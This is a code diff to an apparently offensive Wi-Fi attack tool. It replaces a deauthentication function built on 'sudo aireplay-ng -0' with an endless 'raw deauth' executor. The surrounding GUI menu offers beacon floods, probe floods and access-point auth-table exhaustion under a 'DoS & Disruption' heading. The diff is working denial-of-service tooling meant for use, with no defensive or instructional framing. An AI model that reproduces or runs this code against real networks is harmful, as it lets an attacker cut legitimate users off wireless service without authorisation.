@@ -170,12 +170,17 @@ class LocalExecutor:
 
     # ── DoS & Disruption ──
     @staticmethod
-    def do_deauth(interface=None, bssid="", station="", count=10, reason=7):
-        interface = interface or LocalExecutor._detect_iface()
-        if station:
-            LocalExecutor._bg(f"sudo aireplay-ng -0 {count} -a {bssid} -c {station} {interface}", "Deauth")
-        else:
-            LocalExecutor._bg(f"sudo aireplay-ng -0 {count} -a {bssid} {interface}", "Deauth")
+    def do_deauth(interface=None, bssid="", station="", reason=7, **kwargs):
+        from hackit.wireless.executor import HackITWirelessExecutor
+        if not interface: interface = LocalExecutor._detect_iface()
+        if not interface:
+            tslog("[x] No wireless interface found", "red")
+            return
+        exc = HackITWirelessExecutor()
+        try:
+            exc.do_deauth(interface, bssid, station, reason=reason)
+        except Exception as e:
+            tslog(f"[x] Deauth failed: {e}", "red")
 
     @staticmethod
     def do_beacon_flood(interface=None, ssid=None, count=500, channel=6):
@@ -1089,7 +1094,7 @@ class HackITWirelessGUI:
 
         categories = {
             "DoS & Disruption": [
-                ("DEAUTH","do_deauth","Deauth clients from AP",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("station",""),("count",10),("reason",7),("band","2.4/5")]),
+                ("DEAUTH","do_deauth","Infinite raw deauth (Ctrl+C to stop)",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("station",""),("reason",7)]),
                 ("BEACON FLOOD","do_beacon_flood","Flood fake beacons",[("interface", LocalExecutor._detect_iface() or ""),("ssid",""),("count",500),("channel",6),("band","2.4/5")]),
                 ("PROBE FLOOD","do_probe_flood","Mass probe requests",[("interface", LocalExecutor._detect_iface() or ""),("count",1000)]),
                 ("AUTH DoS","do_auth_dos","Exhaust AP auth table",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",1000)]),
